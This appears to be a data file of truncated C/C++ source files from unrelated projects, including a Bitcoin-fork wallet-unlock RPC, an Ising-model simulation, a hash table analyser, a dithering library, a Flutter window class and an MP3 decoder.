_pipeline->descriptorSet->initImage(0, scene->sceneTexture->imageView, scene->sceneTe",
    "// Copyright (c) 2011-2022 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <rpc/util.h>\n#include <wallet/rpc/util.h>\n#include <wallet/wallet.h>\n\n\nnamespace wallet {\nRPCHelpMan walletpassphrase()\n{\n    return RPCHelpMan{\"walletpassphrase\",\n                \"\\nStores the wallet decryption key in memory for 'timeout' seconds.\\n\"\n                \"This is needed prior to performing transactions related to private keys such as sending bitcoinluminarys\\n\"\n            \"\\nNote:\\n\"\n            \"Issuing the walletpassphrase command while the wallet is already unlocked will set a new unlock\\n\"\n            \"time that overrides the old one.\\n\",\n                {\n                    {\"passphrase\", RPCArg::Type::STR, RPCArg::Optional::NO, \"The wallet passphrase\"},\n                    {\"timeout\", RPCArg::Type::NUM, RPCArg::Optional::NO, \"The time to keep the decryption key in seconds; capped at 100000000 (~3 years).\"},\n                },\n                RPCResult{RPCResult::Type::NONE, \"\", \"\"},\n                RPCExamples{\n            \"\\nUnlock the wallet for 60 seconds\\n\"\n            + HelpExampleCli(\"walletpassphrase\", \"\\\"my pass phrase\\\" 60\") +\n            \"\\nLock the wallet again (before 60 seconds)\\n\"\n            + HelpExampleCli(\"walletlock\", \"\") +\n            \"\\nAs a JSON-RPC call\\n\"\n            + HelpExampleRpc(\"walletpassphrase\", \"\\\"my pass phrase\\\", 60\")\n                },\n        [&](const RPCHelpMan& self, const JSONRPCRequest& request) -> UniValue\n{\n    std::shared_ptr<CWallet> const wallet = GetWalletForJSONRPCRequest(request);\n    if (!wallet) return UniValue::VNULL;\n    CWallet* const pwallet = wallet.get();\n\n    int64_t nSleepTime;\n    int64_t relock_time;\n    // Prevent concurrent calls to walletpassphrase with the same wallet.\n    LOCK(pwallet->m_unlock_mutex);\n    {\n        LOCK(pwallet->cs_wallet);\n\n        if (!pwallet->IsCrypted()) {\n            throw JSONRPCError(RPC_WALLET_WRONG_ENC_STATE, \"Error: running with an unencrypted wallet, but walletpassphrase was called.\");\n        }\n\n        // Note that the walletpassphrase is stored in request.params[0] which is not mlock()ed\n        SecureString strWalletPass;\n        strWalletPass.reserve(100);\n        strWalletPass = std::string_view{request.params[0].get_str()};\n\n        // Get the timeout\n        nSleepTime = request.params[1].getInt<int64_t>();\n        // Timeout cannot be negative, otherwise it will relock immediately\n        if (nSleepTime < 0) {\n            throw JSONRPCError(RPC_INVALID_PARAMETER, \"Timeout cannot be negative.\");\n        }\n        // Clamp timeout\n        constexpr int64_t MAX_SLEEP_TIME = 100000000; // larger values trigger a macos/libevent bug?\n        if (nSleepTime > MAX_SLEEP_TIME) {\n            nSleepTime = MAX_SLEEP_TIME;\n        }\n\n        if (strWalletPass.empty()) {\n            throw JSONRPCError(RPC_INVALID_PARAMETER, \"passphrase cannot be empty\");\n        }\n\n        if (!pwallet->Unlock(strWalletPass)) {\n            // Check if the passphrase has a null character (see #27067 for details)\n            if (strWalletPass.find('\\0') == std::string::npos) {\n                throw JSONRPCError(RPC_WALLET_PASSPHRASE_INCORRECT, \"Error: The wallet passphrase entered was incorrect.\");\n            } else {\n                throw JSONRPCError(RPC_WALLET_PASSPHRASE_INCORRECT, \"Error: The wallet passphrase entered is incorrect. \"\n                                                                    \"It contains a null character (ie - a zero byte). \"\n                                                                    \"If the passphrase was set with a version of this software prior to 25.0, \"\n                                                                    \"please try again with only the characters up to \u2014 but not including \u2014 \"\n                                                                    \"the first null character. If this is successful, please set a new \"\n                                                                    \"passphrase to avoid this issue in the future.\");\n            }\n        }\n\n        pwallet->TopUpKeyPool();\n\n        pwallet->nRelockTime = GetTime() + nSleepTime;\n        relock_time = pwallet->nRelockTime;\n    }\n\n    // rpcRunLater must be called without cs_wallet held otherwise a deadlock\n    // can occur. The deadlock would happen when RPCRunLater removes the\n    // previous timer (and waits for the callback to finish if already running)\n    // and the callback locks cs_wallet.\n    AssertLockNotHeld(wallet->cs_wallet);\n    // Keep a weak pointer to the wallet so that it is possible to unload the\n    // wallet before the following callback is called. If a valid shared pointer\n    // is acquired in the callback then the wallet is still loaded.\n    std::weak_ptr<CWallet> weak_wallet = wallet;\n    pwallet->chain().rpcRunLater(strprintf(\"lockwallet(%s)\", pwallet->GetName()), [weak_wa",
    "#include \"cullvox/noodle.h\"\n\nnamespace cullvox {\n\nnoodle::noodle(std::string name, noodle_variant value)\n    : _name(name)\n    , _type((noodle_type)value.index())\n    , _value(value)\n    , _is_array(false)\n    , _array()\n    , _children()\n{\n}\n\nnoodle::noodle(std::string name, noodle_array value)\n    : _name(name)\n    , _type((noodle_type)value.index())\n    , _value()\n    , _is_array(true)\n    , _array(value)\n    , _children()\n{\n}\n\nnoodle& noodle::operator=(const noodle& rhs) \n{\n    _name = rhs._name;\n    _type = rhs._type;\n    _value = rhs._value;\n    _is_array = rhs._is_array;\n    _array = rhs._array;\n    _children = rhs._children;\n\n    return *this;\n}\n\nnoodle& noodle::operator=(noodle_variant rhs)\n{\n    _type = (noodle_type)rhs.index();\n    _value = rhs;\n    _is_array = false;\n    _array = {};\n    _children = {};\n\n    return *this;\n}\n\nnoodle& noodle::operator=(noodle_array rhs)\n{\n    _type = (noodle_type)rhs.index();\n    _value = {};\n    _is_array = false;\n    _array = rhs;\n    _children = {};\n\n    return *this;\n}\n\nnoodle& noodle::operator[](const std::string& key)\n{\n    return _children[key];\n}\n\nvoid noodle::set_name(std::string name)\n{\n    _name = name;\n}\n\nstd::string noodle::name() const\n{\n    return _name;\n}\n\nnoodle_type noodle::type() const\n{\n    return _type;\n}\n\nsize_t noodle::size() const\n{\n    if (is_array())      return std::visit([](auto&& arg){return arg.size();}, _array);\n    else if (is_group()) return _children.size();\n    else                 return 0;\n}\n\nbool noodle::is_integer() const { return _type == noodle_type::integer; }\nbool noodle::is_boolean() const { return _type == noodle_type::boolean; }\nbool noodle::is_string() const { return _type == noodle_type::string; }\nbool noodle::is_float() const { return _type == noodle_type::floating; }\nbool noodle::is_array() const { return _is_array; }\nbool noodle::is_group() const { return _type == noodle_type::group; }\n\nstd::string noodle::to_string() const\n{\n    return \"IMPLEMENT ME!\";\n}\n\nstd::string noodle::dump() const\n{\n    std::stringstream ss;\n    recursive_dump(ss);\n    return ss.str();\n}\n\nvoid noodle::dump_value(std::stringstream& ss) const\n{\n    switch (_type) {\n    case noodle_type::integer:\n    case noodle_type::floating:\n    case noodle_type::boolean:\n    case noodle_type::string:\n        std::visit([&ss](auto&& arg){ ss << arg; }, _value);\n        break;\n    case noodle_type::group:\n        ss << \"{\";\n        for (const std::pair<std::string, noodle>& child : _children) {\n            child.second.recursive_dump(ss);\n        }\n        ss << \"}\";\n        break;\n    }\n}\n\nvoid noodle::dump_array(std::stringstream& ss) const\n{\n    switch (_type) {\n    case noodle_type::integer:\n    case noodle_type::floating:\n    case noodle_type::boolean:\n    case noodle_type::string:\n        std::visit([&ss](auto&& arg){ \n            for (const auto& value : arg) {\n                ss << value << \",\";\n            }\n        }, _array);\n        break;\n    case noodle_type::group:\n        // throw std::runtime_error(\"Arrays of groups do not exist.\");\n        break;\n    }\n}\n\nvoid noodle::recursive_dump(std::stringstream& ss) const\n{\n    ss << _name << \"=\";\n\n    if (_is_array) dump_array(ss);\n    else dump_value(ss);\n\n    ss << \",\";\n}\n\nenum class noodle_token \n{\n    unexpected,\n    identifier,\n    integer,\n    floating,\n    boolean,\n    string,\n    left_curly,\n    right_curly,\n    left_bracket,\n    right_bracket,\n    equal,\n    comma,\n    end,\n    newline,\n};\n\n}",
    "/*\n    DITHER.CPP\n    Dither Library based on works of Alchemy Mindworks Inc 1995\n    The entire source is kept, but the bits not needed in ManpWIN are copied out PHD 2019-06-03\n\n    Written in Microsoft Visual C++ by Paul de Leeuw.\n*/\n\n#include <windows.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include \"manpwin.h\"\n#include \"quanterr.h\"\n#include \"Dib.h\"\n#include \"anim.h\"\n#include \"colour.h\"\n\n#define\tWRGB_RED\t\t2\n#define\tWRGB_GREEN\t\t1\n#define\tWRGB_BLUE\t\t0\n#define\tDITHERCONTRAST\t\t20\n#define\tDITHERBRIGHTNESS\t20\n#define\tGREYVALUE(r,g,b)\t((((r*30)/100) + ((g*59)/100) + ((b*11)/100)))\n#define\tORTHOMATCH(r,g,b)\t(((r) & 0x00e0) | (((g) >> 3) & 0x001c)  | (((b) >> 6) & 0x0003))\n#define\tLPBcolourmap(lpbi)\t(LPRGBQUAD)((LPSTR)lpbi+lpbi->biSize)\n#define DIBPAL(pDib)\t\tLPBcolourmap(((LPBITMAPINFOHEADER)pDib))\n\n\n//extern\tint\tForce24Bit(void);\n//extern\tvoid\tChangeView(int, int, int, int, int, int, int, int, char);\n//extern\tvoid\tSetupView(void);\n//extern\tint\tGeneratePalette(char *, char *, char *);\n//extern\tint\tdl1quant(BYTE *, BYTE *, int, int, int, int, BYTE *);\nextern\tint\tdl3quant(BYTE *, BYTE *, int, int, int, int, BYTE *);\n//extern\tint\tSetupUndo(void);\nextern\tvoid\tUpdateTitleBar(HWND);\n//extern\tvoid\tCreateTitleBar(char *, char *, int, int, int);\n//extern\tvoid\tShowMessage(char *);\n\n//////////////////////////////////////////////////////////////////////////////////////////////////////\nextern\tHWND\tGlobalHwnd;\t\t\t\t// This is the main windows handle\n//////////////////////////////////////////////////////////////////////////////////////////////////////\n\tHCURSOR\thStdCursor;\n//extern\tBYTE\t*PalettePtr;\t\t\t\t// points to true colour palette\n\n// Global Variables:\nextern\tCDib\t\t\tDib;\t\t\t// Device Independent Bitmap class instance\nstatic\tCDib\t\t\tDitherDib;\t\t// Device Independent Bitmap class instance\nextern\tCTrueCol\t\tTrueCol;\t\t// palette info\n\nBYTE\t\tDitherBitsPerPixel = 24;\t\t// for reducing bits per pixel\n\n#define GetChunkyPixel(pxx,nxx) (!((nxx) & 1)) ? (((pxx)[(nxx)>>1] >> 4) & 0x0f) : ((pxx)[(nxx)>>1] & 0x0f)\n#define\tPutChunkyPixel(pxx,nxx,cxx) (!(nxx & 1)) ? \\\n(pxx[nxx>>1] &= 0x0f, pxx[nxx>>1] |= (char)((cxx & 0x0f) << 4)) : \\\n(pxx[nxx>>1] &= 0xf0, pxx[nxx>>1] |= (char)(cxx & 0x0f))\n\n#ifndef max\n#define max(a,b)            (((a)>(b))?(a):(b))\n#endif\n\n#ifndef min\n#define min(a,b)            (((a)<(b))?(a):(b))\n#endif\n\n#define\taddb(n1,n2)\t    max(min((BYTE)(n1)+(short)(n2),255),0)\n\nextern\tvoid\tCloseDitherPointers(BYTE);\n\nstatic\tint\tReturnCode = NO_ERR;\t\t// For error tracking\nstatic\tHANDLE\thdest = NULL;\nstatic\tHANDLE\thsource = NULL;\nstatic\tLPBITMAPINFOHEADER lpbd = NULL;\nstatic\tLPBITMAPINFOHEADER lpbs = NULL;\nstatic\tchar\t*pstr;\t\t\t\t// file name without path\n//char\t\tDitherFlag = '2';\t\t// 1 = Bayer or Diffuse Floyd, 2 = Floyd_Steinberg\n// 3 = Floyd_Steinberg + 'Optimal Colour Mapper'\n\n\tBYTE\t\tmasktable[8] = {0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01};\nstatic\tBYTE\t\tbittable[8]={0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80};\n\nstatic\tchar bayerPattern[8][8] =\n    {\n    {\t 0,32, 8,40, 2,34,10,42, },\n    {\t48,16,56,24,50,18,58,26, },\n    {\t12,44, 4,36,14,46, 6,38, },\n    {\t60,28,52,20,62,30,54,22, },\n    {\t 3,35,11,43, 1,33, 9,41, },\n    {\t51,19,59,27,49,17,57,25, },\n    {\t15,47, 7,39,13,45, 5,37, },\n    {\t63,31,55,23,61,29,53,21  },\n    };\n\nint GetDibPalette(LPBITMAPINFO lpbi,BYTE *palette)\n    {\n    unsigned int i,j;\n\n    j=min(1<<lpbi->bmiHeader.biBitCount,256);\n\n    for(i=0;i<j;i++)\n\t{\n\tpalette[i*RGB_SIZE+RGB_RED]=lpbi->bmiColors[i].rgbRed;\n\tpalette[i*RGB_SIZE+RGB_GREEN]=lpbi->bmiColors[i].rgbGreen;\n\tpalette[i*RGB_SIZE+RGB_BLUE]=lpbi->bmiColors[i].rgbBlue;\n\t}\n    return(j);\n    }\n\n/**************************************************************************\nLinear 256 Colour Palette\n**************************************************************************/\n\nvoid\tGetOrthoPalette(BYTE *buffer)\n    {\n    static int expandbits32[]={ 32,64,96,128,160,192,224,255 };\n    static int expandbits16[]={ 64,128,192,255 };\n    static char palette[VGA_PAL_SIZE];\n    int r,g,b,i,rr,gg,bb;\n\n    for(r=0;r<8;++r)\n\t{\n\tfor(g=0;g<8;++g)\n\t    {\n\t    for(b=0;b<4;++b)\n\t\t{\n\t\trr=expandbits32[r];\n\t\tgg=expandbits32[g];\n\t\tbb=expandbits16[b];\n\n\t\ti=ORTHOMATCH(r<<5,g<<5,b<<6);\n\t\tpalette[i*RGB_SIZE+RGB_RED]=(char)rr;\n\t\tpalette[i*RGB_SIZE+RGB_GREEN]=(char)gg;\n\t\tpalette[i*RGB_SIZE+RGB_BLUE]=(char)bb;\n\t\t}\n\t    }\n\t}\n\n    if(buffer != NULL) memcpy(buffer,palette,768);\n    }\n\n/**************************************************************************\nDithering Engine for 256 Colours\n**************************************************************************/\n\n/*\nvoid DiffuseFloyd(BYTE *line1,BYTE *line2,short x,short y,short r,\n    short g,short b,short mr,short mg,short mb,short width,short depth)\n    {\n    short dr,dg,db,xpos,vr,vg,vb, a1, b1, c1;\n\n    dr=(r-mr)>>4;\n    dg=(g-mg)>>4;\n    db=(b-mb)>>4;\n\n    vr=dr<<1;\n    vg=dg<<1;\n    vb=db<<1;\n\n    if((x+1) < width && (y+1) < depth)\n\t{\n\txpos=RGB_SIZE*(x+1);\n\ta1 = *(line2 + xpos+WRGB_RED)  =addb(*(line2 + xpos+WRGB_RED),d",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <ctime>\n#include <numeric>\n#include <random>\n\n// container's structures\nstruct _METROPOLIS_CONTAINER\n{\n    std::vector<int> STATE;\n    double CAPACITY;\n    double ENERGY;\n};\n\nstruct _TEMPERING_CONTAINER\n{\n    std::vector<std::vector<double>> CAPACITY;\n    std::vector<std::vector<double>> ENERGY;\n    std::vector<std::vector<int>> SUCCESSFUL_COPIES;\n};\n\nclass _SPIN_SYSTEM\n{\nprivate:\n    int SIZE, NUM_OF_COPIES, REPEAT, NUM_OF_STEPS;\n    float T_MIN, T_MAX;\n    std::vector<std::vector<int>> CAPACITY;\n    std::vector<std::vector<int>> ENERGY;\npublic:\n    //  Class constructor\n    _SPIN_SYSTEM(int _SIZE, int _NUM_OF_COPIES, int _REPEAT, int _NUM_OF_STEPS, float _T_MIN, float _T_MAX)\n        : SIZE(_SIZE),\n        NUM_OF_COPIES(_NUM_OF_COPIES),\n        REPEAT(_REPEAT),\n        NUM_OF_STEPS(_NUM_OF_STEPS),\n        T_MIN(_T_MIN),\n        T_MAX(_T_MAX) {}\n\n    // functions of class\n\n    // generate the random state of spins\n    std::vector<std::vector<int>> random_states()\n    {\n        std::vector<int> ones = { -1, 1 };\n        std::vector<std::vector<int>> states(NUM_OF_COPIES, std::vector<int>(SIZE * SIZE));\n\n        srand(time(0));\n\n        for (int i = 0; i < NUM_OF_COPIES; ++i)\n        {\n            for (int j = 0; j < SIZE * SIZE; ++j)\n                states[i][j] = ones[rand() % 2];\n        }\n\n        return states;\n    };\n\n    // generate the vector with temperatures \n    std::vector<std::vector<float>> temperatures_generate()\n    {\n        std::vector<std::vector<float>> temperatures(NUM_OF_STEPS, std::vector<float>(NUM_OF_COPIES));\n        float delta_T = (T_MAX - T_MIN) / (NUM_OF_COPIES - 1);\n        float plus_delta_T;\n\n        for (int i = 0; i < NUM_OF_STEPS; ++i)\n        {\n            plus_delta_T = T_MIN;\n            for (int j = 0; j < NUM_OF_COPIES; ++j)\n            {\n                temperatures[i][j] = plus_delta_T;\n                plus_delta_T += delta_T;\n            }\n        }\n        return temperatures;\n    };\n\n\n    int energy_metropolis(std::vector<int> state)\n    {\n        std::vector<std::vector<int>> energy_array(SIZE, std::vector<int>(SIZE));\n\n        for (int i = 0; i < SIZE; ++i)\n        {\n            for (int j = 0; j < SIZE; ++j)\n            {\n                if (i + 1 == SIZE && j + 1 == SIZE)\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE] + state[j]);\n                else if (j + 1 == SIZE)\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE] + state[(i + 1) * SIZE + j]);\n                else if (i + 1 == SIZE)\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE + (j + 1)] + state[j]);\n                else\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE + (j + 1)] + state[(i + 1) * SIZE + j]);\n            }\n        }\n\n        int sum = 0;\n\n        for (int i = 0; i < SIZE * SIZE; ++i)\n            sum += energy_array[i / SIZE][i % SIZE];\n\n        return sum;\n    };\n\n    _METROPOLIS_CONTAINER metropolis(float T, std::vector<int> state, int REPEAT, int SIZE)\n    {\n        std::vector<int> E_VECT(REPEAT);\n\n        std::mt19937 gen ((int)time(0));\n        std::uniform_real_distribution<> urd (0., 1.);\n\n        for (int j = 0; j < REPEAT; ++j)\n        {\n            int k = rand() % (SIZE * SIZE);\n            std::vector<int> copied_state = state;\n\n            copied_state[k] = (-1) * copied_state[k];\n\n            int E1 = energy_metropolis(state);\n            int E2 = energy_metropolis(copied_state);\n            int delta_E = E2 - E1;\n\n            double one = urd(gen);\n            double p = std::pow(2.718282, (-1) * delta_E / T);\n\n\n            if (one < p)\n            {\n                state = copied_state;\n                // if (delta_E > 0) std::cout << \"ERROR\";\n            }\n            else\n                delta_E = 0;\n\n            if (j == 0)\n                E_VECT[j] = energy_metropolis(state);\n            else\n                E_VECT[j] = E_VECT[j - 1] - delta_E;\n\n            E_VECT[j] = energy_metropolis(state);\n        }\n        // mean energy\n        int E_SUM = 0;\n        for (int x : E_VECT) E_SUM += x;\n\n\n        double MEAN_E = (double)E_SUM / (double)E_VECT.size();\n\n        // mean squared_energy\n        E_SUM = 0;\n        for (int x : E_VECT) E_SUM += x * x;\n\n\n        double MEAN_E_SQUARED = (double)E_SUM / (double)E_VECT.size();\n\n\n        double capacity = (MEAN_E_SQUARED - MEAN_E * MEAN_E) / (T * T * SIZE * SIZE);\n        _METROPOLIS_CONTAINER _container;\n\n        _container.STATE = state;\n        _container.ENERGY = MEAN_E;\n        _container.CAPACITY = capacity;\n\n        return _container;\n    };\n\n    _TEMPERING_CONTAINER tempering(std::vector<std::vector<float>> temperatures, std::vector<std::vector<int>> states)\n    {\n        std::vector<std::vector<int>> successful_copies(NUM_OF_STEPS, std::vector<int>(NUM_OF_COPIES - 1));\n        std::vector<std::vector<do",
    "#include \"hashtable.hpp\"\n\n// Aiden: maybe use uint64_t for size? (or use size_t everywhere?)\n\nErrorCode CreateHashTable (HashTable* ht, size_t bucketsQuantity, hashFunction_t hashFunction)\n{\n    AssertSoft(ht, NULL_PTR);\n\n    SafeCalloc(temp, List, bucketsQuantity, NO_MEMORY_AVAILABLE);\n\n    ht->size = bucketsQuantity;\n\n    ht->lists = temp;\n\n    for (int i = 0; i < bucketsQuantity; i++)\n    {\n        CreateList(&ht->lists[i]);\n    }\n\n    ht->hashFunction = hashFunction;\n\n    return OK;\n}\n\nErrorCode DestroyHashTable (HashTable* ht)\n{\n    AssertSoft(ht, NONE_EXISTING);\n\n    for (int i = 0; i < ht->size; i++)\n    {\n        DestroyList(&ht->lists[i]);\n    }\n\n    free(ht->lists);\n\n    ht->size = 0;\n\n    ht->hashFunction = NULL;\n\n    return OK;\n}\n\nErrorCode findElement (HashTable* ht, size_t listIndex, Elem_t elem)\n{\n    AssertSoft(ht,                   NULL_PTR);\n    AssertSoft(elem,                 NULL_PTR);\n    AssertSoft(listIndex < ht->size, INDEX_OUT_OF_RANGE);\n\n    for (int elemIndex = 0; elemIndex < ht->lists[listIndex].size; elemIndex++)\n    {\n        if (! strcmp(elem, ht->lists[listIndex].ptr[elemIndex].value))\n        {\n            ht->lists[listIndex].ptr[elemIndex].count += 1;\n\n            return FOUND;\n        }\n    }\n\n    return NOT_FOUND;\n}\n \nErrorCode fillHashTable (HashTable* ht, Text* text)\n{\n    AssertSoft(ht,   NULL_PTR);\n    AssertSoft(text, NULL_PTR);\n\n    for (int i = 0; i < text->numLines; i++)\n    {\n        uint64_t listIndex = ht->hashFunction(text->lines[i].string, text->lines[i].length); \n\n        listIndex %= ht->size;\n\n        if (findElement(ht, listIndex, text->lines[i].string) == NOT_FOUND)\n        {\n            PushBack(&ht->lists[listIndex], text->lines[i].string);\n        } \n    }\n\n    return OK;\n}\n\nErrorCode fillHashData (HashTable* ht, const char* outputFileName, const char* hashName)\n{\n    AssertSoft(ht,             NULL_PTR);\n    AssertSoft(outputFileName, NULL_PTR);\n    AssertSoft(hashName,       NULL_PTR);\n\n    myOpen(outputFileName, \"w\", outputFile);\n\n    fprintf(outputFile, \"%s\\n\", hashName);\n\n    for (int i = 0; i < ht->size; i++)\n    {\n        for (int j = 0; j < ht->lists[i].size; j++)\n        {\n            fprintf(outputFile, \"%d\\n\", i);\n        }\n    }\n\n    fprintf(outputFile, \"%d\", ht->size);\n\n    myClose(outputFile);\n\n    system(\"python3 scripts/plot.py hashres.txt\");\n    system(\"python3 scripts/plotlog.py hashres.txt\");\n\n    return OK;\n}\n\nsize_t countSumSizeOfLists (HashTable* ht)\n{\n    AssertSoft(ht, NULL_PTR);\n\n    size_t sumSizeOfLists = 0;\n\n    for (int i = 0; i < ht->size; i++)\n    {\n        sumSizeOfLists += ht->lists[i].size;\n    }\n\n    return sumSizeOfLists - ht->size; // because of the shadow element in the list\n}\n\ndouble calculateLoadFactor (size_t bucketsQuantity, hashFunction_t hashFunction, const char* inputFile)\n{\n    HashTable ht = {};\n    CreateHashTable(&ht, bucketsQuantity, hashFunction);\n\n    Text text = {};\n    CreateText(&text, inputFile);\n\n    fillHashTable(&ht, &text);\n\n    double LoadFactor = (double) countSumSizeOfLists(&ht) / (double) bucketsQuantity;\n\n    double varianceFactor = 0;\n\n    for (int i = 0; i < bucketsQuantity; i++)\n    {\n        if (ht.lists[i].size > 1)\n        {\n            varianceFactor += (LoadFactor - ht.lists[i].size - 1) * (LoadFactor - ht.lists[i].size - 1);\n        }\n    }\n\n    printf(\"variance: %lg\\n\", varianceFactor / bucketsQuantity);\n\n    DestroyText(&text);\n    DestroyHashTable(&ht);\n\n    return varianceFactor / bucketsQuantity;\n}\n\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n * mp3_decoder.cpp\n * libhelix_HMP3DECODER\n *\n *  Created on: 26.10.2018\n *  Updated on: 27.05.2022\n */\n#include \"mp3_decoder.h\"\n/* clip to range [-2^n, 2^n - 1] */\n#if 0 //Fast on ARM:\n#define CLIP_2N(y, n) { \\\n\tint sign = (y) >> 31;  \\\n\tif (sign != (y) >> (n))  { \\\n\t\t(y) = sign ^ ((1 << (n)) - 1); \\\n\t} \\\n}\n#else //on xtensa this is faster, due to asm min/max instructions:\n#define CLIP_2N(y, n) { \\\n    int x = 1 << n; \\\n    if (y < -x) y = -x; \\\n    x--; \\\n    if (y > x) y = x; \\\n}\n#endif\n\nconst uint8_t  m_SYNCWORDH              =0xff;\nconst uint8_t  m_SYNCWORDL              =0xf0;\nconst uint8_t  m_DQ_FRACBITS_OUT        =25;  // number of fraction bits in output of dequant\nconst uint8_t  m_CSHIFT                 =12;  // coefficients have 12 leading sign bits for early-terminating mulitplies\nconst uint8_t  m_SIBYTES_MPEG1_MONO     =17;\nconst uint8_t  m_SIBYTES_MPEG1_STEREO   =32;\nconst uint8_t  m_SIBYTES_MPEG2_MONO     =9;\nconst uint8_t  m_SIBYTES_MPEG2_STEREO   =17;\nconst uint8_t  m_IMDCT_SCALE            =2;   // additional scaling (by sqrt(2)) for fast IMDCT36\nconst uint8_t  m_NGRANS_MPEG1           =2;\nconst uint8_t  m_NGRANS_MPEG2           =1;\nconst uint32_t m_SQRTHALF               =0x5a82799a;  // sqrt(0.5) in Q31 format\n\n\nMP3FrameInfo_t *m_MP3FrameInfo;\nSFBandTable_t m_SFBandTable;\nStereoMode_t m_sMode;  /* mono/stereo mode */\nMPEGVersion_t m_MPEGVersion;  /* version ID */\nFrameHeader_t *m_FrameHeader;\nSideInfoSub_t m_SideInfoSub[m_MAX_NGRAN][m_MAX_NCHAN];\nSideInfo_t *m_SideInfo;\nCriticalBandInfo_t m_CriticalBandInfo[m_MAX_NCHAN];  /* filled in dequantizer, used in joint stereo reconstruction */\nDequantInfo_t *m_DequantInfo;\nHuffmanInfo_t *m_HuffmanInfo;\nIMDCTInfo_t *m_IMDCTInfo;\nScaleFactorInfoSub_t m_ScaleFactorInfoSub[m_MAX_NGRAN][m_MAX_NCHAN];\nScaleFactorJS_t *m_ScaleFactorJS;\nSubbandInfo_t *m_SubbandInfo;\nMP3DecInfo_t *m_MP3DecInfo;\n\nconst unsigned short huffTable[4242] PROGMEM = {\n    /* huffTable01[9] */\n    0xf003, 0x3112, 0x3101, 0x2011, 0x2011, 0x1000, 0x1000, 0x1000, 0x1000,\n    /* huffTable02[65] */\n    0xf006, 0x6222, 0x6201, 0x5212, 0x5212, 0x5122, 0x5122, 0x5021, 0x5021, 0x3112, 0x3112, 0x3112,\n    0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101,\n    0x3101, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    0x1000, 0x1000, 0x1000, 0x1000, 0x1000,\n    /* huffTable03[65] */\n    0xf006, 0x6222, 0x6201, 0x5212, 0x5212, 0x5122, 0x5122, 0x5021, 0x5021, 0x3011, 0x3011, 0x3011,\n    0x3011, 0x3011, 0x3011, 0x3011, 0x3011, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112,\n    0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2112, 0x2101, 0x2101, 0x2101,\n    0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101, 0x2101,\n    0x2101, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000, 0x2000,\n    0x2000, 0x2000, 0x2000, 0x2000, 0x2000,\n    /* huffTable05[257] */\n    0xf008, 0x8332, 0x8322, 0x7232, 0x7232, 0x6132, 0x6132, 0x6132, 0x6132, 0x7312, 0x7312, 0x7301,\n    0x7301, 0x7031, 0x7031, 0x7222, 0x7222, 0x6212, 0x6212, 0x6212, 0x6212, 0x6122, 0x6122, 0x6122,\n    0x6122, 0x6201, 0x6201, 0x6201, 0x6201, 0x6021, 0x6021, 0x6021, 0x6021, 0x3112, 0x3112, 0x3112,\n    0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112,\n    0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3112,\n    0x3112, 0x3112, 0x3112, 0x3112, 0x3112, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101, 0x3101,\n    